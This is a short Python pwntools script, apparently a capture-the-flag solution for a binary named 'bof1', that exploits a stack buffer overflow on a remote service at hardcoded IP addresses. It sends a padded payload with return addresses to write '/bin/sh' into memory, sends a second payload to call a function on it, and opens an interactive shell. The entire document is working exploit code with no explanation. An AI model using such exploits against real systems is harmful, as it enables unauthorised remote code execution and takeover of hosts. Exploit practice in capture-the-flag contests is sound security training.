from pwn import *

# r = remote("45.77.245.244",5001)
r = remote("34.94.172.42", 2021)
# r = process("./bof1")
# gdb.attach(r)

payload = "a"*32 + p32(0x80483c0) + p32(0x080485b1) + p32(0x0804ab00)

r.sendline(payload)
r.sendline("/bin/sh\x00")

payload2 = "a"*32 + p32(0x80483e0) + p32(0x080485b1) + p32(0x0804ab00)
r.sendline(payload2)

r.interactive()